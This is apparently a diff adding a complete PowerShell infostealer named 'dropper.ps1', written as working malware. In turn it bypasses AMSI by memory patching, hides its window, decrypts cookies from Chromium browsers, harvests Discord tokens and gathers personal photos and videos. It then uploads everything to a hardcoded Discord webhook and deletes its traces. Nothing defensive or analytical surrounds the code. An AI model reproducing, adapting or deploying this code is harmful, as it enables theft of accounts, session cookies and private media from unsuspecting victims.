@@ -1,0 +1,355 @@
+# language: PowerShell, file: dropper.ps1, target: Windows 10/11, PowerShell 5.1+
+# Stages: AMSI bypass -> stealth -> cookies (JSON) -> Discord tokens -> photos/videos -> exfil
+
+# ─────────────────────────────────────────────────────────────────
+# CONFIG — fill these before uploading to GitHub raw
+# ─────────────────────────────────────────────────────────────────
+$WEBHOOK = '<https://canary.discord.com/api/webhooks/1555621991367835800/lV6qFhFaWkTQgwa70xmjfAOELNr-7s8QGedjtk715PmmVj7NTCu_p8inmMSqh5zLnhJD>'   # e.g. https://discord.com/api/webhooks/...
+$MAX_FILE_MB = 8                          # Discord free tier limit per file
+
+# ─────────────────────────────────────────────────────────────────
+# STAGE 0 — AMSI BYPASS
+# ─────────────────────────────────────────────────────────────────
+try {
+    $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq 'AmsiUtils' }
+    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
+    $b.SetValue($null,$true)
+} catch {}
+
+try {
+    Add-Type -MemberDefinition @"
+[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h, string n);
+[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
+[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+"@ -Name 'K32' -Namespace 'W' -EA Stop
+    $lib = [W.K32]::LoadLibrary('amsi.dll')
+    $ptr = [W.K32]::GetProcAddress($lib, 'AmsiScanBuffer')
+    $old = [uint32]0
+    [W.K32]::VirtualProtect($ptr, [UIntPtr]3, 0x40, [ref]$old) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x31,0xC0,0xC3), 0, $ptr, 3)
+    [W.K32]::VirtualProtect($ptr, [UIntPtr]3, $old, [ref]$old) | Out-Null
+} catch {}
+
+# ─────────────────────────────────────────────────────────────────
+# STAGE 1 — STEALTH
+# ─────────────────────────────────────────────────────────────────
+Set-ExecutionPolicy Bypass -Scope Process -Force
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference    = 'SilentlyContinue'
+
+try {
+    Add-Type -Name W32 -Namespace U -MemberDefinition '
+[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);
+[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();'
+    [U.W32]::ShowWindow([U.W32]::GetConsoleWindow(), 0) | Out-Null
+} catch {}
+
+Add-Type -AssemblyName System.Security
+
+# ─────────────────────────────────────────────────────────────────
+# HELPERS — Chromium AES-GCM decrypt
+# ─────────────────────────────────────────────────────────────────
+function Get-ChromiumMasterKey($udPath) {
+    $ls = Join-Path $udPath 'Local State'
+    if (-not (Test-Path $ls)) { return $null }
+    try {
+        $json   = Get-Content $ls -Raw | ConvertFrom-Json
+        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+        $encKey = $encKey[5..($encKey.Length-1)]
+        return [System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null,'CurrentUser')
+    } catch { return $null }
+}
+
+function Invoke-AesGcmDecrypt([byte[]]$data, [byte[]]$key) {
+    # data layout: [3-byte prefix "v10/v11"][12-byte nonce][ciphertext][16-byte tag]
+    if ($data.Length -lt 31) { return $null }
+    $nonce  = $data[3..14]
+    $rest   = $data[15..($data.Length-1)]
+    $tag    = $rest[($rest.Length-16)..($rest.Length-1)]
+    $cipher = $rest[0..($rest.Length-17)]
+    try {
+        $aes   = [System.Security.Cryptography.AesGcm]::new([byte[]]$key)
+        $plain = New-Object byte[] $cipher.Length
+        $aes.Decrypt([byte[]]$nonce,[byte[]]$cipher,[byte[]]$tag,$plain)
+        return [Text.Encoding]::UTF8.GetString($plain)
+    } catch { return $null }
+}
+
+function Decrypt-Value([byte[]]$enc, [byte[]]$key) {
+    if ($enc.Length -lt 3) { return '' }
+    $pfx = [Text.Encoding]::ASCII.GetString($enc[0..2])
+    if ($pfx -eq 'v10' -or $pfx -eq 'v11') {
+        $r = Invoke-AesGcmDecrypt $enc $key
+        if ($r) { return $r } else { return '' }
+    }
+    try {
+        return [Text.Encoding]::UTF8.GetString(
+            [System.Security.Cryptography.ProtectedData]::Unprotect($enc,$null,'CurrentUser'))
+    } catch { return '' }
+}
+
+# Ensure sqlite3.exe is available
+$sqlite3 = "$env:TEMP\sq3.exe"
+if (-not (Test-Path $sqlite3)) {
+    try {
+        $zip = "$env:TEMP\sqtools.zip"
+        Invoke-WebRequest 'https://www.sqlite.org/2024/sqlite-tools-win-x64-3460000.zip' `
+            -OutFile $zip -UseBasicParsing -EA Stop
+        Expand-Archive $zip "$env:TEMP\sqtools" -Force
+        $exe = Get-ChildItem "$env:TEMP\sqtools" -Filter 'sqlite3.exe' -Recurse | Select-Object -First 1
+        Copy-Item $exe.FullName $sqlite3
+    } catch { $sqlite3 = $null }
+}
+
+# ─────────────────────────────────────────────────────────────────
+# STAGE 2 — BROWSER COOKIES → JSON
+# Output: $cookieJson  (array of objects, serialized to JSON file)
+# ─────────────────────────────────────────────────────────────────
+$browsers = [ordered]@{
+    Chrome  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    Edge    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    Brave   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    Opera   = "$env:APPDATA\Opera Software\Opera Stable"
+    Vivaldi = "$env:LOCALAPPDATA\Vivaldi\User Data"
+}
+
+$allCookies = [System.Collections.Generic.List[object]]::new()
+
+foreach ($b in $browsers.GetEnumerator()) {
+    $bName = $b.Key; $base = $b.Value
+    if (-not (Test-Path $base)) { continue }
+    $masterKey = Get-ChromiumMasterKey $base
+    $profiles  = @('Default') + (Get-ChildItem $base -Directory -Filter 'Profile *' -EA SilentlyContinue |
+                    Select-Object -ExpandProperty Name)
+
+    foreach ($prof in $profiles) {
+        $dbPath = Join-Path $base "$prof\Network\Cookies"
+        if (-not (Test-Path $dbPath)) { $dbPath = Join-Path $base "$prof\Cookies" }
+        if (-not (Test-Path $dbPath) -or -not $sqlite3) { continue }
+
+        $tmp = "$env:TEMP\ck_${bName}_${prof}.db"
+        Copy-Item $dbPath $tmp -Force -EA SilentlyContinue
+        if (-not (Test-Path $tmp)) { continue }
+
+        # Columns: host_key | name | encrypted_value | path | expires_utc | is_secure | is_httponly
+        $rows = & $sqlite3 -separator "`t" $tmp `
+            "SELECT host_key,name,encrypted_value,path,expires_utc,is_secure,is_httponly FROM cookies;" 2>$null
+        Remove-Item $tmp -Force -EA SilentlyContinue
+
+        foreach ($row in $rows) {
+            $f = $row -split "`t"
+            if ($f.Count -lt 3) { continue }
+            $decVal = if ($masterKey) {
+                Decrypt-Value ([Text.Encoding]::Latin1.GetBytes($f[2])) $masterKey
+            } else { '' }
+            if (-not $decVal) { continue }
+            $secureVal   = if ($f.Count -gt 5 -and $f[5]) { [int]$f[5] } else { 0 }
+            $httponlyVal = if ($f.Count -gt 6 -and $f[6]) { [int]$f[6] } else { 0 }
+            $allCookies.Add([pscustomobject]@{
+                browser  = $bName
+                profile  = $prof
+                host     = $f[0]
+                name     = $f[1]
+                value    = $decVal
+                path     = $f[3]
+                expires  = $f[4]
+                secure   = [bool]$secureVal
+                httponly = [bool]$httponlyVal
+            })
+        }
+    }
+}
+
+$cookieJsonPath = "$env:TEMP\cookies.json"
+$allCookies | ConvertTo-Json -Depth 4 | Out-File $cookieJsonPath -Encoding UTF8
+
+# ─────────────────────────────────────────────────────────────────
+# STAGE 3 — DISCORD TOKEN HARVEST
+# ─────────────────────────────────────────────────────────────────
+$tokenRx    = [regex]'(mfa\.[a-zA-Z0-9_\-]{84}|[a-zA-Z0-9_\-]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27,38})'
+$encTokenRx = [regex]'dQw4w9WgXcQ:[^"]*'
+
+$tokens = [System.Collections.Generic.List[string]]::new()
+
+function Get-AppKey($appDataSub) {
+    $ls = "$env:APPDATA\$appDataSub\Local State"
+    if (-not (Test-Path $ls)) { return $null }
+    try {
+        $j   = Get-Content $ls -Raw | ConvertFrom-Json
+        $ek  = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
+        $ek  = $ek[5..($ek.Length-1)]
+        return [System.Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser')
+    } catch { return $null }
+}
+
+$discordApps = @(
+    @{ name='discord';       lvl="$env:APPDATA\discord\Local Storage\leveldb" }
+    @{ name='discordcanary'; lvl="$env:APPDATA\discordcanary\Local Storage\leveldb" }
+    @{ name='discordptb';    lvl="$env:APPDATA\discordptb\Local Storage\leveldb" }
+)
+# Also check browser LevelDB (Discord web app)
+$browserLvl = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
+)
+
+foreach ($app in $discordApps) {
+    if (-not (Test-Path $app.lvl)) { continue }
+    $key = Get-AppKey $app.name
+    Get-ChildItem $app.lvl -Include '*.ldb','*.log' -Recurse -EA SilentlyContinue | ForEach-Object {
+        $txt = [IO.File]::ReadAllText($_.FullName, [Text.Encoding]::Latin1)
+        $tokenRx.Matches($txt) | ForEach-Object { $tokens.Add("[$($app.name)][plain] $($_.Value)") }
+        if ($key) {
+            $encTokenRx.Matches($txt) | ForEach-Object {
+                $b64 = ($_.Value -split ':',2)[1]
+                try {
+                    $dec = Decrypt-Value ([Convert]::FromBase64String($b64)) $key
+                    if ($dec -and $tokenRx.IsMatch($dec)) { $tokens.Add("[$($app.name)][enc] $dec") }
+                } catch {}
+            }
+        }
+    }
+}
+foreach ($lvl in $browserLvl) {
+    if (-not (Test-Path $lvl)) { continue }
+    Get-ChildItem $lvl -Include '*.ldb','*.log' -Recurse -EA SilentlyContinue | ForEach-Object {
+        $txt = [IO.File]::ReadAllText($_.FullName, [Text.Encoding]::Latin1)
+        $tokenRx.Matches($txt) | ForEach-Object { $tokens.Add("[browser-web][plain] $($_.Value)") }
+    }
+}
+
+$uniqueTokens = $tokens | Sort-Object -Unique
+$tokenJsonPath = "$env:TEMP\tokens.json"
+$uniqueTokens | ConvertTo-Json | Out-File $tokenJsonPath -Encoding UTF8
+
+# ─────────────────────────────────────────────────────────────────
+# STAGE 4 — PHOTOS & VIDEOS COLLECTION
+# Grabs images/videos from Desktop, Downloads, Pictures, Videos, Documents
+# Skips files > MAX_FILE_MB to stay under Discord upload limit
+# ─────────────────────────────────────────────────────────────────
+$maxBytes  = $MAX_FILE_MB * 1MB
+$mediaExts = @('*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.webp',
+               '*.mp4','*.mov','*.avi','*.mkv','*.wmv','*.webm')
+
+$searchDirs = @(
+    [Environment]::GetFolderPath('Desktop')
+    [Environment]::GetFolderPath('MyDocuments')
+    "$env:USERPROFILE\Downloads"
+    "$env:USERPROFILE\Pictures"
+    "$env:USERPROFILE\Videos"
+    "$env:USERPROFILE\OneDrive\Pictures"
+    "$env:USERPROFILE\OneDrive\Videos"
+)
+
+$mediaFiles = [System.Collections.Generic.List[System.IO.FileInfo]]::new()
+foreach ($dir in $searchDirs) {
+    if (-not (Test-Path $dir)) { continue }
+    foreach ($ext in $mediaExts) {
+        Get-ChildItem $dir -Filter $ext -Recurse -EA SilentlyContinue |
+            Where-Object { $_.Length -le $maxBytes -and $_.Length -gt 0 } |
+            ForEach-Object { $mediaFiles.Add($_) }
+    }
+}
+
+# ─────────────────────────────────────────────────────────────────
+# STAGE 5 — EXFIL TO DISCORD WEBHOOK
+# Discord multipart upload: POST multipart/form-data with file attachments
+# ─────────────────────────────────────────────────────────────────
+function Send-DiscordFile([string]$wh, [string]$filePath, [string]$caption) {
+    if (-not (Test-Path $filePath)) { return }
+    try {
+        $boundary = [Guid]::NewGuid().ToString('N')
+        $fileName = [IO.Path]::GetFileName($filePath)
+        $fileBytes = [IO.File]::ReadAllBytes($filePath)
+
+        # Build multipart body manually (PS doesn't have native multipart for IRM pre-7)
+        $body = [IO.MemoryStream]::new()
+        $enc  = [Text.Encoding]::UTF8
+
+        # -- payload_json part
+        $jsonPart = "--$boundary`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n" +
+                    "{`"content`":`"$caption`"}`r`n"
+        $jsonBytes = $enc.GetBytes($jsonPart)
+        $body.Write($jsonBytes, 0, $jsonBytes.Length)
+
+        # -- file part
+        $filePart = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
+        $filePartBytes = $enc.GetBytes($filePart)
+        $body.Write($filePartBytes, 0, $filePartBytes.Length)
+        $body.Write($fileBytes, 0, $fileBytes.Length)
+
+        $end = $enc.GetBytes("`r`n--$boundary--`r`n")
+        $body.Write($end, 0, $end.Length)
+        $bodyBytes = $body.ToArray()
+
+        $req = [Net.HttpWebRequest]::Create($wh)
+        $req.Method      = 'POST'
+        $req.ContentType = "multipart/form-data; boundary=$boundary"
+        $req.ContentLength = $bodyBytes.Length
+        $req.UserAgent   = 'Mozilla/5.0'
+        $req.Timeout     = 30000
+
+        $stream = $req.GetRequestStream()
+        $stream.Write($bodyBytes, 0, $bodyBytes.Length)
+        $stream.Close()
+        $req.GetResponse() | Out-Null
+    } catch {}
+}
+
+function Send-DiscordText([string]$wh, [string]$content, [string]$username='harvest') {
+    try {
+        $body = @{ username=$username; content=$content } | ConvertTo-Json
+        Invoke-RestMethod -Uri $wh -Method Post -Body $body `
+            -ContentType 'application/json' -UseBasicParsing -EA Stop
+    } catch {}
+}
+
+# ── Send summary embed ──────────────────────────────────────────
+$hostInfo = "$env:COMPUTERNAME | $env:USERNAME | $(
+    (Get-WmiObject Win32_OperatingSystem).Caption) | $(
+    (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress } |
+        Select-Object -First 1 -ExpandProperty IPAddress)[0]
+)"
+
+$embed = @{
+    username = 'harvest'
+    embeds   = @(@{
+        title  = "New Hit — $env:USERNAME@$env:COMPUTERNAME"
+        color  = 0xFF4444
+        fields = @(
+            @{ name='Host Info';      value=$hostInfo;                    inline=$false }
+            @{ name='Cookies Found';  value="$($allCookies.Count)";      inline=$true  }
+            @{ name='Tokens Found';   value="$($uniqueTokens.Count)";    inline=$true  }
+            @{ name='Media Files';    value="$($mediaFiles.Count)";      inline=$true  }
+        )
+    })
+} | ConvertTo-Json -Depth 6
+
+Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $embed `
+    -ContentType 'application/json' -UseBasicParsing -EA SilentlyContinue
+
+Start-Sleep -Seconds 1
+
+# ── Send cookies.json ───────────────────────────────────────────
+Send-DiscordFile $WEBHOOK $cookieJsonPath "**cookies.json** — $($allCookies.Count) entries"
+Start-Sleep -Milliseconds 500
+
+# ── Send tokens.json ────────────────────────────────────────────
+Send-DiscordFile $WEBHOOK $tokenJsonPath "**tokens.json** — $($uniqueTokens.Count) unique"
+Start-Sleep -Milliseconds 500
+
+# ── Send media files (up to 25 per webhook, then next batch) ────
+$batchSize = 10   # stay well under rate limit
+$sent = 0
+foreach ($f in $mediaFiles) {
+    Send-DiscordFile $WEBHOOK $f.FullName "**$($f.Name)** ($([Math]::Round($f.Length/1KB,1)) KB)"
+    $sent++
+    if ($sent % $batchSize -eq 0) { Start-Sleep -Seconds 2 }   # rate-limit cooldown
+    Start-Sleep -Milliseconds 300
+}
+
+# ── Cleanup ─────────────────────────────────────────────────────
+Remove-Item $cookieJsonPath,$tokenJsonPath -Force -EA SilentlyContinue
+Remove-Item "$env:TEMP\sqtools" -Recurse -Force -EA SilentlyContinue
+Remove-Item "$env:TEMP\sqtools.zip","$env:TEMP\sq3.exe" -Force -EA SilentlyContinue
